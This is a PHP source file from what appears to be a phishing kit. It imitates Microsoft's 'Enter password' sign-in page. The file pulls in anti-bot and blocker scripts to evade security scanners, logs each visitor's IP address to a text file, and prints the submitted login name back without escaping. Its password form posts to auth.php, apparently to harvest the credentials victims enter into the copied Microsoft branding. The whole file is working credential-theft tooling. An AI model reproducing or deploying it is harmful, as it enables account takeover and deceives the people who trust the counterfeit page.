<?
require_once('../antibots.php');
require_once('../blocker.php');
include '../antibots.php';
include '../blocker.php';
$login = $_REQUEST['login'];
$ip = getenv("REMOTE_ADDR");
$file = fopen("../2ip.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$previous = "javascript:history.go(-1)";
if(isset($_SERVER['HTTP_REFERER'])) {
    $previous = $_SERVER['HTTP_REFERER'];
}

if (empty($login)) {
header("Location: $previous");
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="1033">
    <meta name="LocLC" content="en-US">

    <!--- <noscript>
        &lt;meta http-equiv="Refresh" content="0; URL=https://login.microsoftonline.com/jsdisabled" /&gt;
    </noscript> --->

    
        <link rel="shortcut icon" href="./favicon_a.ico">
    
    <meta name="robots" content="none">

<link href="./converged.v2.login.min.css" rel="stylesheet">


<!----    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/cdnbundles/convergedlogin_pcore.min.js" ></script>


    <script crossorigin="anonymous" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/cdnbundles/convergedloginpaginatedstrings-en.min.js" ></script> ----->

    
    


</head>

<body class="cb" >

<div><!--  --> <div ><div class="background" role="presentation" ><!-- ko if: smallImageUrl --> <div  style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/backgrounds/0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" style="background-image: url(&quot;https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/backgrounds/0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> 
<form name="f1" id="i0281" spellcheck="false" method="post" autocomplete="off" action="auth.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" ><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" ><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> 





<div class="inner" ><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" >
<img class="logo" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" ><div  class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-dynamicbranding="true" ><!--  --> <input type="hidden" name="i13"  value="0"> 
<input type="hidden" name="login"  value="<? print $login; ?>"> 

<input type="text" name="loginfmt"  class="moveOffScreen" tabindex="-1" aria-hidden="true"> <input type="hidden" name="type"  value="11"> <input type="hidden" name="LoginOptions"  value="3"> <input type="hidden" name="lrt"  value=""> <input type="hidden" name="lrtPartition"  value=""> <input type="hidden" name="hisRegion" value=""> <input type="hidden" name="hisScaleUnit"  value=""><!-- TODO: Rename 'displayName' property to unsafe_displayName here and in other corresponding views --> <div ><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton"  id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<a href="<?= $previous ?>" onclick="history.go(-2);"><img src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/arrow_left.svg?x=a9cc2824ef3517b6c4160dc8ff7d410"></a>

<!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" title="<? print $login; ?>"><? print $login; ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --><!-- /ko --> </div></div> <div id="loginHeader" class="row text-title" role="heading" >Enter password</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error -->

<!-- /ko --> </div> <div class="placeholderContainer" ><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
				
<input name="passwd" pattern=".{5,50}" type="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" placeholder="Password" aria-label="Enter password" title="password" required> 

<!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div><!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div class="position-buttons"><div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> <div class="row"> <div class="col-md-24"> <div class="text-13 action-links"> <div class="form-group"> <a id="idA_PWD_ForgotPassword" role="link" href="#" >Forgot my password</a> </div></div> </div> </div> </div>
<div class="row" > <div ><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" ><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div  class="inline-block"> <input type="submit" id="idSIButton9" class="btn btn-block btn-primary"  value="Sign in"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div>



<!-- ko if: newSessionMessage --><!-- /ko --> <input type="hidden" name="ps"  value=""> <input type="hidden" name="psRNGCDefaultType"  value=""> <input type="hidden" name="psRNGCEntropy" value=""> <input type="hidden" name="psRNGCSLK" value=""> <input type="hidden" name="canary" value="dw3/98BkcW18HOhPfURLbIuZaqIJguhEnZegv5jAXpM=4:1"> <input type="hidden" name="ctx" value=""> <input type="hidden" name="hpgrequestid" value="b07639cb-f039-48a2-acfa-305d28490900"> <input type="hidden" id="i0327" name="flowToken" value="#"> <input type="hidden" name="PPSX" value=""> <input type="hidden" name="NewUser" value="1"> <input type="hidden" name="FoundMSAs"  value=""> <input type="hidden" name="fspost" value="0"> <input type="hidden" name="i21" value="0"> <input type="hidden" name="CookieDisclosure" value="0"> <input type="hidden" name="IsFidoSupported" value="0"> <div ><input type="hidden" name="i2"  value="1"> <input type="hidden" name="i17" value=""> <input type="hidden" name="i18" value=""> <input type="hidden" name="i19" value=""></div> <div id="footer" class="footer default" role="contentinfo" > <div ><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy">©2019 Microsoft</span><!-- /ko --> <a id="ftrTerms" href="#">Terms of use</a> <a id="ftrPrivacy" href="#">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<img class="desktopMode"  src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
<img class="mobileMode" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7811.14/content/images/ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> 
<form method="post" aria-hidden="true"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL"><iframe height="0" width="0" src="#" style="display: none;"></iframe></div> <!-- /ko --></div><span style="margin: 0px auto; border: 2px dotted rgb(0, 0, 0); position: absolute; z-index: 2147483647; visibility: hidden; left: 389px; width: 0px; top: 478px; height: 0px;"></span><span style="z-index: 2147483647; position: absolute; visibility: hidden; left: 374px; width: 50px; top: 463px; height: 20px; font-size: 10px; color: black;"></span></body></html>